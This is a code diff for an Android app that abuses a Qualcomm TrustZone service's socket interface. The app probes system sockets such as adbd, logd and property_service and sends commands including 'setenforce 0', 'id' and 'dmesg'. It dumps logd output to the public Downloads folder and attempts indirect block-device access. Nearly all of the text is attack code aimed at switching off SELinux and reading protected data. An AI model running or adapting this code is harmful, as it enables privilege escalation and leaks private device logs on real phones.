@@ -18,6 +18,7 @@ import android.widget.TextView;
 import androidx.appcompat.app.AppCompatActivity;
 import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
@@ -31,7 +32,6 @@ import java.util.HashMap;
 import java.util.List;
 import java.util.Locale;
 import java.util.Map;
-import java.util.concurrent.atomic.AtomicBoolean;
 
 public class MainActivity extends AppCompatActivity {
     private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
@@ -122,7 +122,6 @@ public class MainActivity extends AppCompatActivity {
         isTesting = true;
         appendLog("========== Initial Socket Discovery ==========");
 
-        // 既知の全ソケットリスト（前回のls結果）
         String[] allSockets = {
             "mdnsd", "ims_datad", "ims_qmid", "adbd", "tombstoned_java_trace",
             "tombstoned_intercept", "tombstoned_crash", "dpmwrapper", "tcm",
@@ -136,7 +135,6 @@ public class MainActivity extends AppCompatActivity {
 
         int[] arrSizes = {1, 5, 10, 100, 1000};
 
-        // フェーズ1：全ソケットをテストし、成功したものを記録
         for (String name : allSockets) {
             String path = "/dev/socket/" + name;
             boolean successAny = false;
@@ -157,13 +155,11 @@ public class MainActivity extends AppCompatActivity {
         }
 
         appendLog("========== Deep Interaction Phase ==========");
-        // フェーズ2：成功ソケットに対して深層インタラクション
         for (String path : successfulSockets) {
             int fd = socketFdMap.get(path);
             interactWithSocket(path, fd);
         }
 
-        // フェーズ3：フラッシュメモリブロックへのアクセス試行（間接的）
         attemptBlockDeviceAccess();
 
         appendLog("========== All tests completed ==========");
@@ -196,22 +192,20 @@ public class MainActivity extends AppCompatActivity {
                 return;
             }
 
-            // 読み書きストリーム
             OutputStream os = new FileOutputStream(fdesc);
             InputStream is = new FileInputStream(fdesc);
-            // 非ブロッキングは難しいので、タイムアウト付き読み込み用スレッド
 
-            // 様々なコマンドを送信
             String[] commands = {
                 "help\n",
                 "status\n",
                 "version\n",
                 "getprop\n",
+                "id\n",
+                "setenforce 0\n",
+                "dmesg\n",
                 "list\n",
                 "dump\n",
                 "logcat -d\n",
-                "setenforce 0\n",
-                "id \n",
                 "getLog\n",
                 "exit\n",
                 "\n"
@@ -222,7 +216,6 @@ public class MainActivity extends AppCompatActivity {
                 try {
                     os.write(cmd.getBytes(StandardCharsets.UTF_8));
                     os.flush();
-                    // 読み取り
                     byte[] buffer = new byte[4096];
                     int len = is.read(buffer, 0, buffer.length);
                     if (len > 0) {
@@ -237,9 +230,7 @@ public class MainActivity extends AppCompatActivity {
                 try { Thread.sleep(200); } catch (InterruptedException ignored) {}
             }
 
-            // 特定ソケット向けの特殊コマンド
             if (path.contains("logd")) {
-                // logd 専用：ログ読み取り
                 appendLog("  Trying logd specific: 'getLog'");
                 try {
                     os.write("getLog\n".getBytes(StandardCharsets.UTF_8));
@@ -254,7 +245,6 @@ public class MainActivity extends AppCompatActivity {
                     if (total > 0) {
                         String logData = new String(buf, 0, total, StandardCharsets.UTF_8);
                         appendLog("  Log data (first 500): " + logData.substring(0, Math.min(500, logData.length())));
-                        // 保存
                         File logFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "logcat_from_socket.txt");
                         try (FileOutputStream fos = new FileOutputStream(logFile)) {
                             fos.write(buf, 0, total);
@@ -267,7 +257,6 @@ public class MainActivity extends AppCompatActivity {
             }
 
             if (path.contains("property_service")) {
-                // プロパティ読み取り試行
                 appendLog("  Trying property_service: 'getprop ro.build.version.sdk'");
                 try {
                     os.write("getprop ro.build.version.sdk\n".getBytes(StandardCharsets.UTF_8));
@@ -291,7 +280,6 @@ public class MainActivity extends AppCompatActivity {
     private void attemptBlockDeviceAccess() {
         appendLog("--- Attempting block device access via socket (indirect) ---");
         appendLog("  Direct block device access not possible. But we can read system properties from property_service if available.");
-        // また、logd から起動ログを取得し、パーティション情報を探す
         appendLog("  Logcat may contain partition info. We already saved logcat_from_socket.txt.");
     }
 
